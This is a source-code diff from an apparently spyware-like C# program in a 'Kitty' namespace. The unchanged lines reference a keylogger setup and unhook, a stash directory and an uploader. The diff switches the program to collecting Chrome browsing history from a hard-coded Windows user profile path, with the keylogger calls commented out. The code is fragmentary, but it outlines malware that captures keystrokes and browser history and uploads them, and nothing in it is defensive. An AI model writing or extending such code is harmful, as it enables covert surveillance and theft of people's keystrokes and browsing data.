@@ -1,4 +1,5 @@
-﻿using Kitty.Stash;
+﻿using Kitty.Db;
+using Kitty.Stash;
 using Kitty.Win32;
 using System;
 #if DEBUG
@@ -39,15 +40,25 @@ namespace Kitty
             }
             await new SimpleUploader(stashProvider).UploadAsync();
         }
+        public static DateTimeOffset FromUnixTimeMilliseconds(long milliseconds)
+        {
+            if (milliseconds < -62135596800000L || milliseconds > 253402300799999L)
+                throw new ArgumentOutOfRangeException("milliseconds", milliseconds, "");
+
+            return new DateTimeOffset(milliseconds * 10000L + 621355968000000000L, TimeSpan.Zero);
+        }
 
         static void Main(string[] args)
         {
-            MaintainApplication();
-            FindStashDirectory();
-            SetupKeylogger();
-            ApplicationInformation.VerifyApplition();
+            SQLiteConnectionProvider inputConnection = new SQLiteConnectionProvider("C:\\Users\\xuans\\AppData\\Local\\Google\\History1");
+            SQLiteConnectionProvider outputConnection = new SQLiteConnectionProvider("C:\\Users\\xuans\\AppData\\Local\\Google\\History");
+            new ChromeHistoryCollector(inputConnection, outputConnection).CollectAsync();
+            //MaintainApplication();
+            //FindStashDirectory();
+            //SetupKeylogger();
+            //ApplicationInformation.VerifyApplition();
             Application.Run();
-            Keylogger.Unhook();
+            //Keylogger.Unhook();
         }
     }
 }
